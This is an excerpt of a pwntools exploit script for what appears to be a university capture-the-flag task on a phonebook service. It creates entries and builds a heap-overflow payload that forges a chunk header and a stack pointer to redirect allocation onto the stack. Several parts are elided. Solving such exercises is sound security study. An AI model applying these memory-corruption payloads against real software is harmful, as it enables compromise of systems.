...
#conn = pwn.remote('tasks.ws24.softsec.rub.de', 33722)
...
start_entry_stack = stack_address_top_of_stack_in_main + 0x48 - 32 - 8 - 8
...
# 1.1) create entry 0 (at higher stack address):
conn.sendline(b'A')
conn.recvuntil(b'Phone number: ')
conn.sendline(b'42')
conn.recvuntil(b'Name: ')
conn.sendline(b'attacker')
conn.recvuntil(b'> ')

# in memory (heap, first: realy0sh1 then at a higher address: attacker)
...
payload = b'A'*48 + pwn.p64(0x0) + pwn.p64(0x71) + pwn.p64(start_entry_stack) + pwn.p64(0x0)
